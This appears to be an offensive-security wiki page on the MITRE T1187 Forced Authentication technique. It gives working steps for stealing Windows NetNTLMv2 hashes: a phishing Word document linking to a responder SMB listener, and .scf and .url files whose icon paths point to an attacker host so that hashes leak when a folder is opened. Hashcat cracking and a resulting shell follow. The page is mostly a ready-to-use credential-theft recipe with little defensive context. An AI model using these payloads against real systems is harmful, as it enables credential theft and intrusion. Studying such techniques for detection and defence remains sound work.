---
description: 'Credential Access, Stealing hashes'
---

# T1187: Forced Authentication

## Execution via Hyperlink to an SMB server

Attacker creates a fake MS Word document that has a hyperlink to attackers server where a `responder` is listening on port 445 and will be capturing the victim's `NetNTLMv2` hash if they click the dodgy link in the below document:

![](../.gitbook/assets/forced-auth-word.png)

{% file src="../.gitbook/assets/totes-not-a-scam.docx" caption="Forced SMBv2 Authentication - MS Word File" %}

Attacker starts a responder so he can receive incoming SMB authentication request in order to capture the victim's hashes:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
responder -I eth1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Attacker sends the malicious document to the unsuspectim victim and convinces them to click the link. Once they click the link in the document, `responder` on the attacker's system captures victim's hash:

![](../.gitbook/assets/forced-auth-hashes.png)

Once attacker got the hash, he can try and crack it using hashcat:

```csharp
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

Success, the password is cracked:

![](../.gitbook/assets/forced-auth-cracked.png)

Using the cracked passsword to get a shell on the victim system:

![](../.gitbook/assets/forced-auth-shell%20%281%29.png)

## Execution via .SCF

Place the below `fa.scf` file on an attacker controlled machine at `10.0.0.7` in a shared folder `tools`

{% code-tabs %}
{% code-tabs-item title="\\\\10.0.0.7\\tools\\fa.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\10.0.0.5\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% file src="../.gitbook/assets/fa.scf" caption="fa.scf" %}

An victim user `low` then opens the share `\\10.0.0.7\tools`, `fa.scf` gets executed and the user's hashes are sent to the attackers machine:

![victim opens \\10.0.0.7\tools, fa.scf executes and gives away low&apos;s hashes](../.gitbook/assets/forced-auth-shares.png)

![user&apos;s low hashes were received by the attacker](../.gitbook/assets/forced-auth-scf.png)

What's interesting with the `.scf` attack is that the file could easily be downloaded with a browser and as soon as the victim opens the Downloads folder, the hashes are stolen:

![](../.gitbook/assets/forced-auth-downloads.png)

## Execution via .URL

{% code-tabs %}
{% code-tabs-item title="c:\\link.url@victim" %}
```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.0.0.5\%USERNAME%.icon
IconIndex=1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```text
responder -I eth1 -v
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Once user navigates to the C:\ where `link.url` file is placed, the file will try to authenticate to our malicious SMB listener on `10.0.0.5` \(attacker machine\) that will capture user's NTLM hashes:

![](../.gitbook/assets/forced-authentication-url.gif)

{% embed url="https://attack.mitre.org/wiki/Technique/T1187" %}

[http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)

{% embed url="https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/" %}

{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}

{% embed url="https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208" %}

